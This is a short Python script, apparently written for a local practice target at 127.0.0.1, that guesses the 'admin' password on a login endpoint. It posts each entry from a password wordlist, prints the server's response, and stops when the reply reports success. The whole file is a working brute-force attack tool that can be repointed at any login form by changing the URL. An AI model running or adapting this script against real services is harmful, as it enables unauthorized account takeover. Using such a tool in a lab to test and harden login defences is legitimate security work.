import requests
import time

url = "http://127.0.0.1:5001/login"   # FIXED PORT
username = "admin"

with open("passwords.txt", "r") as f:
    for password in f:
        password = password.strip()

        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data)

        print(f"Trying: {password} -> {response.text}")

        # stop if success
        if "successful" in response.text.lower():
            print("Password FOUND:", password)
            break

        time.sleep(0.5)   # prevent server overload

